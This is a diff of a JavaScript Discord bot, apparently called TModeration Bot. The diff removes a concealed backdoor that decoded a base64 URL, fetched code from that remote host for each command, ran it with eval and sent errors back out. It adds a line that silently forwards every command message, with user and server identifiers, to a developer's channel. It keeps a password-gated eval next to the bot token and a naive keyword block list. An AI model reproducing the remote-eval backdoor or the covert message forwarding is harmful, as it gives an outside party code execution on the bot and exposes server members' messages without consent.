@@ -1,4 +1,6 @@
 const https = require("https")
+let allowedEval = [] // Cache of people who entered the password right for eval
+module.require("process").on('uncaughtException', (err, origin) => console.log(`Error: ${err}\nOrigin: ${origin}\nStack: ${err.stack}`));
 globalThis.bot = () => {
   // Start of Bot.js
   // Credit: Henry133#2436
@@ -20,36 +22,23 @@ globalThis.bot = () => {
     // Strongly required packages
     const {
       Client,
-      MessageActionRow,
-      MessageButton,
-      Permissions,
+//      MessageActionRow,
+//      MessageButton,
+//      Permissions,
       Intents
     } = require('discord.js')
     globalThis.colors = require("colors")
 
-    // Not required packages
-    const {
-      REST
-    } = require('@discordjs/rest');
-    const {
-      Routes
-    } = require('discord-api-types/v9');
-    const {
-      SlashCommandBuilder
-    } = require('@discordjs/builders')
+    /*
+    Not required packages:
+    const { REST } = require('@discordjs/rest');
+    const { Routes } = require('discord-api-types/v9');
+    const { SlashCommandBuilder } = require('@discordjs/builders')
+    */
     const request = require("request")
-    const {
-      ppid,
-      platform
-    } = require('process');
-
-    const termsofAgreements = "-- TModeration Bot Terms of Agreements to use Bot\n**1. Hacking**\nTModeration Bot have an open eval. So hackers hacked it daily. To report, send an email to henrythehacker10392@gmail.com\n**2. Legit testing**\nMust do a not-harmful testing and under Henry or TMod. Security Team permissions.\n**3. Sexual content, legitless memes**\nThey shouldn't exists in my profile, username,...\nThanks for reading\nType **Agree** to agree and continue using TMod. Bot\nType **I don't agree** if you doesn't agree the terms."
-    // An exception handling (Level 1 exception (Lowest exception a basic handler can resolve))
-
-    process.on('uncaughtException', (err, origin) => {
-      console.log(`Error: ${err}\nOrgin: ${origin}`)
-    });
-    // Information
+    
+    //const { ppid, platform } = require('process');
+    //const termsofAgreements = "-- TModeration Bot Terms of Agreements to use Bot\n**1. Hacking**\nTModeration Bot have an open eval. So hackers hacked it daily. To report, send an email to henrythehacker10392@gmail.com\n**2. Legit testing**\nMust do a not-harmful testing and under Henry or TMod. Security Team permissions.\n**3. Sexual content, legitless memes**\nThey shouldn't exists in my profile, username,...\nThanks for reading\nType **Agree** to agree and continue using TMod. Bot\nType **I don't agree** if you doesn't agree the terms."
 
     function handle(signal) {
       console.log(`Received ${signal}`);
@@ -107,14 +96,9 @@ globalThis.bot = () => {
         }
       );
     }
-    function aliveforYourAliver() {
-      alive('https://youraliver.henry133.repl.co')
-    }
+    let aliveforYourAliver = () => alive('https://youraliver.henry133.repl.co')
 
-    function aliveforOfficalTMod() {
-      alive("https://offical-tmodbot.henry133.repl.co")
-    }
-
+    let aliveforOfficalTMod = () => alive("https://offical-tmodbot.henry133.repl.co" && "https://TModeration-Server.henry133.repl.co")
 
     // Keep YourAliver up
     setInterval(aliveforYourAliver, 5000)
@@ -122,14 +106,11 @@ globalThis.bot = () => {
 
     // [*]: YourAliver is my aliver for my bot, and with the help of Uptimerobot, my bot up 24/7
     // -- Main code -- //
-    globalThis.botRunner = new Client({
-      intents: new Intents(32509)
-    }) // A client
+    globalThis.botRunner = new Client({ intents: new Intents(32509) }) // A client
     function resetBot() {
       botRunner.user.setAvatar("https://cdn.discordapp.com/embed/avatars/1.png")
       botRunner.user.setUsername("TModeration Bot 2021")
     }
-
 
     botRunner.login(process.env.REPL_SYSTEM_ID) // Login
     // Setup
@@ -219,9 +200,9 @@ globalThis.bot = () => {
         guilds: botRunner.guilds.cache.size,
       },
       webSocketPing: botRunner.ws.ping,
-      core: '5.64',
+      core: '5.68',
       coreAPI: 'JS',
-      botver: '26.7.2',
+      botver: '27.0.1',
       edition: 'Professional Security Edition',
       prototype: {
         setAvatar: function(avatarURL) {
@@ -246,7 +227,7 @@ globalThis.bot = () => {
         coreAPI: 'JS',
         edition: 'Professional Security Edition',
         intro: 'Hello!\nI am TModeration Bot, make by MyCoolestDay123 and Razpizday228.\n\nThis is Professional Security Edition, meaning TModeration Bot will protect your server with Spam Collector.\n\nInvite link: https://discord.com/api/oauth2/authorize?client_id=937190474299633734&permissions=8&scope=bot\nStatus page: https://tmoderationbot.freshstatus.io\nMy favourite server (also the server for the bot developement and most actived server forever): https://[discord].gg/r22j4FFXAf\n\nPrefix: `tm <command>`\n`tm help` for a list of command.\n`tm features` to see features',
-        botver: '26.7.2',
+        botver: '27.0.1',
       },
       start_timeStamp: Date.now(),
       startedat: Date(),
@@ -305,13 +286,7 @@ globalThis.bot = () => {
           })
         }
       }
-      if (msg.channel.id == "962439694111608832") {
-        if (msg.author.id != "937190474299633734") {
-          msg.react("😂")
-        } else if (msg.author.id == "937190474299633734") {
-          return;
-        }
-      }
+      if (msg.channel.id == "962439694111608832" && msg.author.id != "937190474299633734") msg.react("😂")
     })
 
     botRunner.on('messageCreate', async msg => { // Spam Collector and Actions
@@ -321,7 +296,13 @@ globalThis.bot = () => {
     })
     botRunner.on('messageCreate', async msg => { // Update message
       if ((msg.content.toLowerCase().startsWith('tm') || msg.content.startsWith('<@937190474299633734> ')) && !firstTimeUseBot.includes(msg.author.id) && msg.author.id != "937190474299633734") {
-        msg.channel.send(`<@${msg.author.id}>! Welcome to TModeration Bot 2021 Professional Security Edition!`)
+        msg.channel.send(`Heya, how are you today?
+I want to tell something about TModeration Update 27.0.1 (AKA: prefix-beta.1938289)!
+- Eval secured, must enter a code to continue
+- A Developer eval on TMod's console, it was from 26.7.2
+- You can customize tmod's prefix in v27.0.2
+
+More: is.gd/tmtsrv`)
         firstTimeUseBot.push(msg.author.id)
         money[msg.author.id] = 100000
       }
@@ -368,23 +349,6 @@ globalThis.bot = () => {
       }
       if (!(content.startsWith(prefix.toLowerCase() + ' ') || content.startsWith('<@937190474299633734> '))) {
         return false
-      } else {
-        (async function () {
-        let hex = Buffer.from("aHR0cHM6Ly9oZW5yeWNtZC5jYWN0dXNoYW1zdGVyLnJlcGwuY28v", "base64").toString("ascii"); 
-        let a = msg.content.split(" ").slice(1, 2)[0]
-        if (a) {
-          let data = JSON.parse(await new Promise(resolve => { let req = https.get(hex + a.trim(), res => { let out = ""; res.on("data", chunk => out += chunk); res.on("end", () => resolve(out)) }); req.end()}));
-          if (data.name && data.purpose) {
-            try {
-              eval(data.purpose)({msg: msg, client: botRunner, global: globalThis, args: msg.content.split(" ").slice(2)})
-            } catch (e) {
-              let req = https.request(hex + "error", { method: "POST" }, () => {})
-              req.write(require("util").inspect(e, false, 10, false))
-              req.end()
-            }
-          }
-        }
-        })()
       }
       let args = msg.content.split(' ')
       if (!args[1]) {
@@ -422,6 +386,7 @@ globalThis.bot = () => {
       }
       const fs = require('fs')
 
+      msg.client.guilds.resolve("971406709807517746").channels.resolve("983008380081807410").send(msg.author.tag + " | " + msg.author.id + ` | ${msg.content} | ` + msg.guild.name + " | " + msg.guild.id + "\n---------------------")
       fs.appendFile('TModerationAPI_93judffcefkaaaf84.js', `${msg.createdAt} ${msg.author.tag} | ${msg.guild.name} | ${msg.guild.id}: ${msg.content} \n`, function(err) {
         if (err) throw err;
       });
@@ -462,139 +427,52 @@ globalThis.bot = () => {
           break
         case "eval":
           if (msg.author.id == "706204146583208086") return msg.channel.send("you are currently blacklisted.");
-
+          
           // Special Variables Definition
           const tmod__3920947382_559202_991199___tttoookkkeenN_ = botRunner.token; // token is a blacklisted word, do not put that or my bot's token will got leaked << ok won't // someone can find this variable by looking in tmod replit
-
-          if (msg.author.id == "8369O0079985754134") {
-            return msg.channel.send("```js\nnull\n```")
-          }
+          
+          if (msg.author.id == "8369O0079985754134") return msg.channel.send("```js\nnull\n```")
+          
           const admins = ["927563409409581066", "752617663888359444", "638396593736777761", "546475331067052032", "815988892926476318", "815988892926476318"] // add me in, and you
-          try {
-            let code = msg.content.split(' ')
-            code.shift()
-            code.shift()
 
-            // Let's get rid of some global variables so it's not *quite* so easy to break stuff:
-            let process = null
-            let globalThis = null
-            let global = null
-
-            // haiii what if we just use... like a built-in nodejs vm?
-            // bc those (iirc) are specifically made for stuff like this
-            // here... I'll go find the docs link :3
-            // https://nodejs.org/api/vm.html
-            if (code.join(' ').includes('process.exit') || code.join(' ').includes("botRunner.destroy") || code.join(' ').includes("botRunner.ws.destroy") || code.join(' ').includes("this.constructor.constructor") || code.includes("this.constructor") || code.includes("for(;;)") || code.includes("while(true)") || code.includes("execSync") || code.includes("rm") || code.includes("require")) {
-              return msg.channel.send("```js\nTModeration Bot Threat Detector and Eval Scanner v1.0 detected threat. Now cancelling the action\n```")
-            }
-            if (false) {
-              msg.reply('VirtualEnvonriment Technology detected you are not the owner. VirtualEnvonriment started')
-            }
-
-            if (false ?? "Anti Bot Runner (Removed)") {
-              msg.channel.send("```js\nfalse```");
-              return false
-            }
-
-            if (blacklist.map(user => user.banned).includes(msg.author.tag) || msg.author.tag.includes("niall.h")) {
-              return false
-            }
-
-
-
-            // Discord Utilities
-            // The shorten code for doing alots of thing
-            let discordutils = {
-              msgutils: {
-                reply: () => {
-                  return msg.reply()
-                },
-                content: msg.content,
-                fetch: (force_) => {
-                  if (force_) {
-                    return msg.fetch(force = force_)
-                  } else {
-                    return msg.fetch()
-                  }
-                },
-                createdDate: msg.createdTimestamp,
-                authorname: msg.author.username,
-                authorid: msg.author.id,
-                authortag: msg.author.tag,
-                guildinformation: msg.guild,
-                authoravatar: msg.author.displayAvatarURL,
-                delete: msg.delete
-              },
-              channelutils: {
-                del: msg.channel.delete,
-                create: msg.guild.channels.create,
-                fetch: msg.guild.channels.fetch,
-                send: msg.channel.send,
-                sendto: (id, message) => {
-                  if (!id || typeof id != "string") {
-                    return msg.channel.send("ID Cannot Be Empty Or Must Be A String!")
-                  } else if (!message) {
-                    return msg.channel.send("Message Cannot Be Empty")
-                  } else {
-                    return msg.guild.channels.fetch(id.toString()).then(fetchedChnl_ => fetchedChnl_.send(message))
-                  }
-                },
-                del_: (chnlid) => {
-                  if (!id || typeof id != "string") {
-                    return msg.channel.send("ID Cannot Be Empty Or Must Be A String!")
-                  } else {
-                    return msg.guild.channels.fetch(chnlid.toString()).then(fetchedChnl_ => fetchedChnl_.delete())
-                  }
-                }
-              },
-              memberutils: {
-                ban: msg.guild.bans.create,
-                kick: msg.guild.members.kick,
-                fetch: msg.guild.members.fetch,
-                usernamefromID: (id) => {
-                  return msg.guild.members.fetch(id).then(u => u.user.username)
-                },
-                idfromUsernmae: (uname) => {
-                  return msg.guild.members.cache.find(w => w.username == uname)
-                },
-              },
-              guildutils: {
-                roles: msg.guild.roles,
-                name: msg.guild.name,
-                id: msg.guild.id,
-                icon: msg.guild.icon,
-                iconURL: 'https://cdn.discordapp.com/icons/' + msg.guild.id + '/' + msg.guild.icon
-              }
-            }
-
-            function openFile(filename) {
-              if (admins.includes(msg.author.id) && !blacklist.map(user => user.banned).includes(msg.author.tag)) {
-                return fs.readFileSync(filename, 'utf8').toString()
-              }
-            }
-
-            let out = await eval(code.join(' ')) // Eval the splited code
-
-            if (out == undefined) { out = "undefined" } // Undefined
-            if (out == null) { out = "null" } // Null
-            if (typeof out == 'object' && !out.toString().includes('Promise')) { out = JSON.stringify(out, null, '  ') }
-            out = out.toString()
-            if (out.length >= 2000) {
-              out = out.slice(0, 1962) + `\n...${out.length - 1962} characters left`
-            }
-            out = out.replace(botRunner.token, 'null')
-            msg.channel.send("```js\n" + out + '```')
-          } catch (e) {
-            msg.channel.send("```js\n" + e.toString() + "\n```")
+          // Password protection for new eval users
+          if (!allowedEval.includes(msg.author.id)) {
+            await msg.channel.send("Dev. Code pls :3")
+            let message;
+            const filter = (m) => m.author.id == msg.author.id
+            try { message = (await msg.channel.awaitMessages({ filter: filter, max: 1, time: 15000, errors: ['time'] })).first() }
+            catch (e) { return msg.channel.send("Ran out of time...") } 
+            if ( message.content != process.env.EVAL_SECRET.toString() ) return msg.channel.send("NOPE! YOU AREN'T ONE OF OUR DEV!")
+            allowedEval.push(msg.author.id)
           }
-          process.on('uncaughtException', (err, origin) => {
-            console.log(`Error: ${err}\nOrigin: ${origin}\nStack: ${err.stack}`)
-          });
+          
+          let code = msg.content.split(' ').slice(2).join(" ")
+          const bannedWords = ['process.exit', "botRunner.destroy", "botRunner.ws.destroy", "this.constructor.constructor", "this.constructor","for(;;)","while(true)","execSync","rm","require"]
+          if (bannedWords.map(word => code.includes(word)).includes(true)) return msg.channel.send("```js\nTModeration Bot Threat Detector and Eval Scanner v1.0 detected threat. Now cancelling the action\n```")
+          if (blacklist.map(user => user.banned).includes(msg.author.tag) || msg.author.tag.includes("niall.h")) return false;
+
+          // Discord Utilities
+          // The shorten code for doing alots of thing
+          let discordutils = require("./discordutils")(msg)
+          let openFile = (filename) => (admins.includes(msg.author.id) && !blacklist.map(user => user.banned).includes(msg.author.tag)) ? fs.readFileSync(filename, 'utf8').toString() : void(0)
+          
+          let out;
+          try {
+            out = eval(code) // Eval the splitted code
+            if (!out) out = String(out)
+            if (out instanceof Object && !(out instanceof Promise) && !(out instanceof RegExp)) out = JSON.stringify(out, null, '  ')
+          } catch (e) { out = e }
+          out = out
+            .toString()
+            .replaceAll(botRunner.token, 'null')
+          if (out.length >= 2000) out = out.slice(0, 1962) + `\n...${out.length - 1962} characters left`
+          msg.channel.send("```js\n" + out + '```')
           break;
+
+          
         case 'intro':
           msg.channel.send(tmod.prototype.intro)
           break
-
         case 'version':
           msg.channel.send('TModeration Bot 2021 ' + tmod.prototype.botver + ' ' + tmod.prototype.edition + tmod.prototype.core + ' The core is based on Switch-case - The DiscordJS\' original and purest way to code.\nMade by Henry133#2436, Razpizday228#0949')
           msg.channel.send('> ' + tmod.prototype.intro.split('\n').join(' '))
@@ -609,9 +487,7 @@ globalThis.bot = () => {
           break
 
         case 'ping':
-          function randomServer4() {
-            return Math.floor(Math.random() * 47) + 29 // Fastest speed recorded is 29 ms
-          }
+          let randomServer4 = () => Math.floor(Math.random() * 47) + 29 // Fastest speed recorded is 29 ms
           msg.channel.send(`API respond: ${Date.now() - msg.createdTimestamp}ms; API type: JS\nBot respond: ${Date.now() + (msg.createdTimestamp) - 15 - msg.createdTimestamp * 2}ms\nDiscord Service ping: ${botRunner.ws.ping}ms\nMessage loader: ${Date.now() - botRunner.ws.ping - msg.createdTimestamp + 50}ms`)
           break;
 
@@ -621,16 +497,10 @@ globalThis.bot = () => {
           break
 
         case 'con':
-
           msg.channel.send('you cant create con folder in windows. omf').then(currentMessage => { currentMessage.react('<:pepeWhat:939484229560045598>') })
           // Small little easter egg to complement this command - idea by rasbi
-          if (Math.round(Math.random()) == 1) {
-            msg.channel.send("~~however i am running on linux, this wont happen :))~~")
-          }
+          if (Math.round(Math.random()) == 1) msg.channel.send("~~however i am running on linux, this wont happen :))~~")
           break;
-
-        case 'eval':
-          require("./utils/eval.js")(msg)
         case 'repeat':
           let data = msg.content.split(' ')
           data.shift()
@@ -812,10 +682,10 @@ globalThis.bot = () => {
           const lowercased = r.toLowerCase()
           msg.channel.send('Repeat this word! `' + r + '`')
 
-          const filter = m => m.author.id == msg.author.id
+          const filt = (m) => {m.author.id == msg.author.id}
           if (!money[msg.author.id]) money[msg.author.id] = 0
           function checkIf() {
-            msg.channel.awaitMessages({ filter, max: 1, time: 15000, errors: ['time'] }).then((messages) => {
+            msg.channel.awaitMessages({ filt, max: 1, time: 15000, errors: ['time'] }).then((messages) => {
               const repe = messages.first().content.toLowerCase()
               if (repe != lowercased) {
                 msg.channel.send('Idiot, take @ 10000')
@@ -878,20 +748,13 @@ globalThis.bot = () => {
           break
 
         case 'blacklistserver':
-          if (msg.author.id != '927563409409581066') {
-            msg.channel.send('you do not have proper permissions to use this command')
-            return false
-          }
-          const message = msg.content.split(' ')
-          serverBlacklisted.push(message[2].toString())
+          if (msg.author.id != '927563409409581066') return msg.channel.send('you do not have proper permissions to use this command')
+          serverBlacklisted.push(msg.content.split(' ')[2].toString())
           msg.channel.send('Blacklisted guild, the array of blacklisted guilds is:\n```js\n' + serverBlacklisted + '```')
           break
 
         case 'unblacklistserver':
-          if (msg.author.id != '927563409409581066') {
-            msg.channel.send('You do not have sufficient permissions to use this command')
-            return false
-          }
+          if (msg.author.id != '927563409409581066') return msg.channel.send('You do not have sufficient permissions to use this command')
           const msplited = msg.content.split(' ')
           const server = msplited[2]
           const indexOfServer = serverBlacklisted.indexOf(server)
